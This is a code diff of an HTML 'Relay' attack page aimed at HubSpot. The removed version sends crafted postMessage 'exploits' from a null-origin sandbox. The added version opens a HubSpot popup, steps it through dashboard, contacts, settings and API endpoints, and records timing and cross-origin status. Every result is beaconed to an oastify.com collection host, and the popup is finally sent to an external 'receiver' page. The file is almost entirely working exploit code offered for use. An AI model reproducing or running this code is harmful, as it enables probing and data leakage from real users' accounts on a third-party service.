@@ -1,47 +1,45 @@
 <!DOCTYPE html>
 <html>
-<head><title>Processing</title></head>
+<head><title>Relay</title></head>
 <body>
-<h1>Loading...</h1>
-<div id="log"></div>
+<h1>Relay</h1>
+<div id="status"></div>
+<script>
+const EXFIL = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
+
+function log(msg) {
+    document.getElementById('status').innerHTML += '<br>' + msg;
+    new Image().src = EXFIL + '/?log=' + encodeURIComponent(msg);
+}
+
+window.addEventListener('message', function(e) {
+    if (e.data && e.data.action === 'startExploit') {
+        log('TRIGGERED');
+        
+        const blob = new Blob([`
+<html>
+<body>
+<h2>Access Probing Attack</h2>
+<div id="log" style="font-family:monospace;font-size:11px;background:#000;color:#0f0;padding:10px;max-height:350px;overflow:auto;"></div>
 <script>
 const E = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
 
-function log(m) {
-    document.getElementById('log').innerHTML += '<br>' + m;
-    new Image().src = E + '/?log=' + encodeURIComponent(m);
+function l(m) { 
+    const d = document.getElementById('log');
+    d.innerHTML += '<br>' + m;
+    d.scrollTop = d.scrollHeight;
+    new Image().src = E + '/?s=' + encodeURIComponent(m); 
 }
 
-log('relay_loaded');
+l('START_origin=' + window.origin);
 
-// CRITICAL: Remove 'allow-same-origin' to get NULL origin
-const sandbox1 = document.createElement('iframe');
-sandbox1.sandbox = 'allow-scripts allow-popups'; // NO allow-same-origin!
-sandbox1.style.cssText = 'width:100%;height:400px;border:3px solid red';
-
-sandbox1.srcdoc = `
-<!DOCTYPE html>
-<html>
-<body>
-<h3>Sandbox (Null Origin Attack)</h3>
-<div id="s1" style="font-family:monospace;font-size:11px;"></div>
-<script>
-const E1 = 'https://sb7vo63by517nq7kyd6fe03t8keb2aqz.oastify.com';
-function l1(m) {
-    document.getElementById('s1').innerHTML += '<br>' + m;
-    new Image().src = E1 + '/?s=' + encodeURIComponent(m);
-}
-
-l1('ORIGIN=' + window.origin);
-
-// Open HubSpot - it will inherit NULL origin
-l1('opening_hubspot');
+l('opening_hubspot');
 let hub = window.open('https://app-eu1.hubspot.com', 'hubspot', 'width=900,height=700');
 
 if (!hub) {
-    l1('ERROR_blocked');
+    l('ERROR_blocked');
 } else {
-    l1('popup_opened');
+    l('popup_opened');
     
     let attempts = 0;
     let checker = setInterval(() => {
@@ -49,83 +47,116 @@ if (!hub) {
         
         try {
             hub.origin;
-            if (attempts % 20 === 0) l1('polling_' + attempts);
+            if (attempts % 20 === 0) l('waiting_' + attempts);
         } catch(e) {
             clearInterval(checker);
-            l1('loaded_after_' + attempts);
+            l('hubspot_loaded_after_' + attempts);
             
-            // Listen for responses
-            window.addEventListener('message', function(resp) {
-                if (resp.source === hub) {
-                    l1('RESPONSE_FROM=' + resp.origin);
-                    l1('RESPONSE_TYPE=' + (resp.data.type || 'unknown'));
+            // Start probing different endpoints
+            let probeIndex = 0;
+            const probes = [
+                {name: 'dashboard', url: 'https://app-eu1.hubspot.com/dashboard/'},
+                {name: 'contacts', url: 'https://app-eu1.hubspot.com/contacts/'},
+                {name: 'settings', url: 'https://app-eu1.hubspot.com/settings/'},
+                {name: 'reports', url: 'https://app-eu1.hubspot.com/reports-dashboard/'},
+                {name: 'email', url: 'https://app-eu1.hubspot.com/email/'},
+                {name: 'api_account', url: 'https://api.hubapi.com/account-info/v3/details'},
+                {name: 'api_contacts', url: 'https://api.hubapi.com/contacts/v1/lists/all/contacts/all'},
+                {name: 'api_settings', url: 'https://api.hubapi.com/settings/v3/users'}
+            ];
+            
+            function probeNext() {
+                if (probeIndex >= probes.length) {
+                    l('ALL_PROBES_COMPLETE');
                     
-                    const data = JSON.stringify(resp.data);
-                    new Image().src = E1 + '/?resp=' + encodeURIComponent(data.substring(0, 600));
-                    
-                    fetch(E1 + '/full', {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: data
-                    });
+                    // Final action: Navigate to our receiver to collect any final data
+                    setTimeout(() => {
+                        l('navigating_to_receiver');
+                        hub.location = 'https://majdch22.github.io/receiver.html';
+                    }, 2000);
+                    return;
                 }
-            });
-            
-            // Send exploits
-            setTimeout(() => {
-                l1('SENDING_EXPLOIT_1');
-                hub.postMessage({
-                    type: 'CONTENT_ASSISTANCE_DELEGATED_REQUEST',
-                    commandId: 'getData',
-                    featureId: 'crm',
-                    parameters: {portalId: '46962361'},
-                    resultCount: 100,
-                    language: 'en',
-                    objectId: '46962361',
-                    applicationId: 'crm',
-                    basePath: '/crm',
-                    maxPollingAttempts: 5,
-                    pollingInterval: 200
-                }, '*');
-            }, 1000);
-            
-            setTimeout(() => {
-                l1('SENDING_EXPLOIT_2');
-                hub.postMessage({
-                    type: 'raw',
-                    _callbackId: 'x' + Date.now(),
-                    body: {
-                        action: 'getData',
-                        portalId: '46962361'
+                
+                const probe = probes[probeIndex];
+                probeIndex++;
+                
+                l('PROBE_' + probeIndex + '_' + probe.name);
+                
+                const startTime = Date.now();
+                
+                // Navigate to the probe URL
+                try {
+                    hub.location = probe.url;
+                } catch(err) {
+                    l('nav_error_' + probe.name + '=' + err.message);
+                    probeNext();
+                    return;
+                }
+                
+                // Wait and measure load time
+                setTimeout(() => {
+                    const loadTime = Date.now() - startTime;
+                    l('timing_' + probe.name + '=' + loadTime + 'ms');
+                    
+                    // Send timing data
+                    new Image().src = E + '/?timing_' + probe.name + '=' + loadTime;
+                    
+                    // Try to detect if navigation succeeded
+                    try {
+                        // If we can still access hub.location, it might be same-origin (error page)
+                        let loc = hub.location.href;
+                        l('accessible_' + probe.name + '=' + loc.substring(0, 50));
+                        new Image().src = E + '/?accessible_' + probe.name + '=true';
+                    } catch(e) {
+                        l('cross_origin_' + probe.name);
+                        new Image().src = E + '/?cross_origin_' + probe.name + '=true';
                     }
-                }, '*');
-            }, 2000);
+                    
+                    // Check if popup is still open
+                    if (hub.closed) {
+                        l('popup_closed_at_' + probe.name);
+                        new Image().src = E + '/?popup_closed=' + probe.name;
+                        return;
+                    }
+                    
+                    // Move to next probe
+                    setTimeout(probeNext, 1000);
+                    
+                }, 3000); // Wait 3 seconds for each probe to load
+            }
             
+            // Start probing after initial delay
             setTimeout(() => {
-                l1('SENDING_EXPLOIT_3');
-                hub.postMessage({
-                    type: 'TOGGLE_DARK_MODE',
-                    isDarkMode: true
-                }, '*');
-            }, 3000);
+                l('STARTING_PROBES');
+                probeNext();
+            }, 2000);
         }
         
         if (attempts > 150) {
             clearInterval(checker);
-            l1('timeout');
+            l('timeout');
         }
     }, 100);
 }
-</script>
+<\/script>
 </body>
 </html>
-`;
+        `], {type: 'text/html'});
+        
+        const blobUrl = URL.createObjectURL(blob);
+        
+        const iframe = document.createElement('iframe');
+        iframe.sandbox = 'allow-scripts allow-popups allow-popups-to-escape-sandbox allow-top-navigation';
+        iframe.src = blobUrl;
+        iframe.style.cssText = 'width:100%;height:400px;border:3px solid red';
+        
+        document.body.appendChild(iframe);
+        log('iframe_added');
+    }
+});
 
-document.body.appendChild(sandbox1);
-log('sandbox_created');
-
-if (window.opener) {
-    window.opener.postMessage({status: 'ready'}, '*');
+if(window.opener) {
+    window.opener.postMessage({status:'ready'},'*');
 }
 </script>
 </body>
